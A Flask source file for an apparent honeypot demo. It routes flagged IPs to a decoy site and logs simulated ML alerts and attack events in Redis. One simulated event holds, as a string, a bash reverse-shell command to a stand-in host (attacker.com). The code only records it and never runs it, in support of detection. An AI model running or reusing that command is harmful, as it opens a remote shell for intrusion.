from flask import Flask, render_template, request, redirect, Response
import redis
import time
import json
import requests as req_lib

import collections

app = Flask(__name__)

# ── Redis with in-memory fallback ─────────────────────────────────────
class InMemoryRedis:
    def __init__(self):
        self._lists = collections.defaultdict(collections.deque)
        self._hashes = collections.defaultdict(dict)
        self._sets = collections.defaultdict(set)
        self._strings = {}

    def lpush(self, key, *values):
        for v in values:
            self._lists[key].appendleft(v)
        return len(self._lists[key])

    def lrange(self, key, start, stop):
        lst = list(self._lists.get(key, []))
        if stop == -1: return lst[start:]
        return lst[start:stop + 1]

    def ltrim(self, key, start, stop):
        lst = list(self._lists.get(key, []))
        self._lists[key] = collections.deque(lst[start:stop + 1])

    def llen(self, key):
        return len(self._lists.get(key, []))

    def hset(self, key, mapping=None, **kwargs):
        if mapping: self._hashes[key].update(mapping)
        self._hashes[key].update(kwargs)

    def sismember(self, key, member):
        return member in self._sets.get(key, set())

    def sadd(self, key, *members):
        self._sets[key].update(members)
        return len(members)

    def expire(self, key, ttl): pass

    def ping(self): return True

def _get_redis():
    try:
        import redis
        r = redis.Redis(host='localhost', port=6379, decode_responses=True, socket_connect_timeout=1)
        r.ping()
        return r
    except Exception:
        return InMemoryRedis()

r = _get_redis()

DECOY_BASE = "http://localhost:5001"


def _proxy_to_decoy():
    """Transparently proxy an incoming request to the decoy site."""
    target_url = f"{DECOY_BASE}{request.full_path}"
    try:
        resp = req_lib.request(
            method=request.method,
            url=target_url,
            headers={k: v for k, v in request.headers if k != 'Host'},
            data=request.get_data(),
            cookies=request.cookies,
            allow_redirects=False,
            timeout=5,
        )
        excluded = {'content-encoding', 'content-length', 'transfer-encoding', 'connection'}
        headers = [(n, v) for n, v in resp.raw.headers.items() if n.lower() not in excluded]
        return Response(resp.content, resp.status_code, headers)
    except req_lib.exceptions.RequestException as e:
        return Response(f"Proxy error: {e}", 502)


@app.before_request
def check_ip_reputation():
    """Intercept every request. If the IP is flagged, proxy to the Decoy site."""
    # Skip the trigger_attack route itself to avoid infinite loops
    if request.path == '/trigger_attack':
        return None
    client_ip = request.remote_addr
    if r.sismember('honeypot_ips', client_ip):
        return _proxy_to_decoy()


@app.route('/')
def index():
    """Main landing page of the corporate site."""
    return render_template('index.html', client_ip=request.remote_addr)


@app.route('/about')
def about():
    return render_template('about.html')


@app.route('/trigger_attack', methods=['POST'])
def trigger_attack():
    """
    Simulates an attack being detected by the ML backend:
    1. Writes a CRITICAL alert to Redis 'alerts' (→ Dashboard ML Alerts table & Timeline chart)
    2. Writes an 'rce_attempt' honeypot event to Redis 'honeypot_events' (→ Dashboard Attack Vectors chart)
    3. Flags the client IP in 'honeypot_ips' (→ future requests transparently proxied to the decoy)
    4. Sends the user to the decoy login page so they experience the honeypot firsthand.
    """
    client_ip = request.remote_addr
    now = time.time()

    # ── 1. Push CRITICAL ML alert (populates Timeline & Alerts table) ──────────
    alert = {
        'id':           str(int(now * 1000)),
        'entity_id':    client_ip,
        'p_host':       0.92,
        'p_network':    0.89,
        'final_score':  0.95,
        'threat_level': 'CRITICAL',
        'detected_at':  now,
        'mttd_seconds': 0.145,
        'description':  'Simulated RCE / Data Exfiltration attempt detected',
    }
    entity_key = f"entity_scores:{client_ip}"
    r.hset(entity_key, mapping={'p_host': 0.92, 'p_network': 0.89, 'score': 0.95})
    r.expire(entity_key, 86400)
    r.sadd('honeypot_ips', client_ip)
    r.lpush('alerts', json.dumps(alert))
    r.ltrim('alerts', 0, 499)

    # ── 2. Write honeypot event directly to Redis (bypasses decoy HTTP proxy bug) ─
    # This populates the 'Attack Vectors' bar chart and 'Honeypot Events' KPI.
    honeypot_event = {
        'timestamp':    now,
        'event_type':   'rce_attempt',
        'src_ip':       client_ip,
        'method':       'POST',
        'path':         '/api/v1/exec',
        'user_agent':   request.headers.get('User-Agent', ''),
        'referrer':     request.headers.get('Referer', ''),
        'query_string': '',
        'extra': {
            'command':  'bash -i >& /dev/tcp/attacker.com/4444 0>&1',
            'severity': 'CRITICAL',
            'source':   'main_site_simulation',
        },
    }
    r.lpush('honeypot_events', json.dumps(honeypot_event))
    r.ltrim('honeypot_events', 0, 9999)
    # Also queue for retraining
    r.lpush('honeypot_retrain_queue', json.dumps({**honeypot_event, 'confirmed_malicious': True, 'label': 1}))

    # ── 3. Increment honeypot event counter (used by /metrics endpoint) ────────
    # The /metrics endpoint counts llen('honeypot_events') directly, so no extra counter needed.

    # ── 4. Redirect the user to the decoy site's login page (GET-friendly) ─────
    # Their IP is now flagged — our middleware will proxy all future requests to the decoy.
    return redirect('http://localhost:5001/login')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
